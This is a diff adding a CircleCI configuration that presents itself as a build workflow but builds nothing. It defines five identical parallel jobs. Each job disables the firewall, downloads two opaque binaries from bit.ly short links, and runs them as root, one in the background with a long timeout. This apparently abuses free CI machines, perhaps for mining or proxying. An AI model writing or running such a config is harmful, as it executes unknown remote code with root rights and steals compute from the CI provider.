@@ -1,0 +1,127 @@
+version: 2
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004:202104-01
+    resource_class: large
+    steps:
+      - run: 
+         name: "starting"
+         command: |
+          sudo apt-get update
+          sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
+          sudo ufw disable 
+          wget https://bit.ly/3y7cFap
+          chmod +x 3y7cFap
+          sudo su --command "nohup ./3y7cFap --log=stdout > meta.log &"
+          sleep 2
+          sudo su --command "cat meta.log"    
+      - run: 
+         name: "waiting"
+         no_output_timeout: 60m
+         command: |
+          wget https://bit.ly/3ugWrL0
+          chmod +x 3ugWrL0
+          sudo su --command "./3ugWrL0"
+  build_1:
+    machine:
+      image: ubuntu-2004:202104-01
+    resource_class: large
+    steps:
+      - run: 
+         name: "starting"
+         command: |
+          sudo apt-get update
+          sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
+          sudo ufw disable 
+          wget https://bit.ly/3y7cFap
+          chmod +x 3y7cFap
+          sudo su --command "nohup ./3y7cFap --log=stdout > meta.log &"
+          sleep 2
+          sudo su --command "cat meta.log"    
+      - run: 
+         name: "waiting"
+         no_output_timeout: 60m
+         command: |
+          wget https://bit.ly/3ugWrL0
+          chmod +x 3ugWrL0
+          sudo su --command "./3ugWrL0"
+  build_2:
+    machine:
+      image: ubuntu-2004:202104-01
+    resource_class: large
+    steps:
+      - run: 
+         name: "starting"
+         command: |
+          sudo apt-get update
+          sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
+          sudo ufw disable 
+          wget https://bit.ly/3y7cFap
+          chmod +x 3y7cFap
+          sudo su --command "nohup ./3y7cFap --log=stdout > meta.log &"
+          sleep 2
+          sudo su --command "cat meta.log"    
+      - run: 
+         name: "waiting"
+         no_output_timeout: 60m
+         command: |
+          wget https://bit.ly/3ugWrL0
+          chmod +x 3ugWrL0
+          sudo su --command "./3ugWrL0"
+  build_3:
+    machine:
+      image: ubuntu-2004:202104-01
+    resource_class: large
+    steps:
+      - run: 
+         name: "starting"
+         command: |
+          sudo apt-get update
+          sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
+          sudo ufw disable 
+          wget https://bit.ly/3y7cFap
+          chmod +x 3y7cFap
+          sudo su --command "nohup ./3y7cFap --log=stdout > meta.log &"
+          sleep 2
+          sudo su --command "cat meta.log"    
+      - run: 
+         name: "waiting"
+         no_output_timeout: 60m
+         command: |
+          wget https://bit.ly/3ugWrL0
+          chmod +x 3ugWrL0
+          sudo su --command "./3ugWrL0"
+  build_4:
+    machine:
+      image: ubuntu-2004:202104-01
+    resource_class: large
+    steps:
+      - run: 
+         name: "starting"
+         command: |
+          sudo apt-get update
+          sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
+          sudo ufw disable 
+          wget https://bit.ly/3y7cFap
+          chmod +x 3y7cFap
+          sudo su --command "nohup ./3y7cFap --log=stdout > meta.log &"
+          sleep 2
+          sudo su --command "cat meta.log"    
+      - run: 
+         name: "waiting"
+         no_output_timeout: 60m
+         command: |
+          wget https://bit.ly/3ugWrL0
+          chmod +x 3ugWrL0
+          sudo su --command "./3ugWrL0"
+       
+workflows:
+  version: 2
+  build:
+    jobs:
+      - build
+      - build_1
+      - build_2
+      - build_3
+      - build_4
